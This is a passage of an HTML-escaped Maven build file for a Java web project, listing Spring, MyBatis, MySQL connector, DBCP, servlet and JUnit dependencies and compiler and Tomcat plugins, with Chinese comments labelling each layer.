            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-expression&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; spring 事务管理和JDBC依赖包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-tx&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-jdbc&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; mysql驱动 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mysql&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mysql-connector-java&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;8.0.18&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; dbcp连接池依赖包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;commons-dbcp&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;commons-dbcp&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.4&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;javax.annotation&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;javax.annotation-api&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.3.1&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; mybatis依赖 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.mybatis&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mybatis&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;3.5.3&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; mybatis-spring整合依赖 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.mybatis&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mybatis-spring&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.0.3&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 持久层依赖结束 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 业务层依赖开始 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 基于AspectJ的aop依赖 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-aspects&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;aopalliance&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;aopalliance&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.0&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 业务层依赖结束 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 表现层依赖开始 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; spring MVC依赖包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-webmvc&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-web&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; jstl &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;javax.servlet&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;jstl&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.2&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; servlet &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;javax.servlet&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;servlet-api&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.5&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;provided&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 表现层依赖结束 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; spring 单元测试组件包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-test&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;test&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 单元测试Junit &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;junit&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;junit&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.12&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;test&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;build&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;plugins&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置Maven的JDK编译级别 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.apache.maven.plugins&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;maven-compiler-plugin&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;3.2&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;target&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;target&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;encoding&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;UTF-8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;encoding&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.apache.tomcat.maven&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;tomcat7-maven-plugin&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.2&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;8080&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; tomcat依赖包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.apache.tomcat.maven&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;tomcat7-maven-plugin&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.2&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;plugin&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;plugins&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
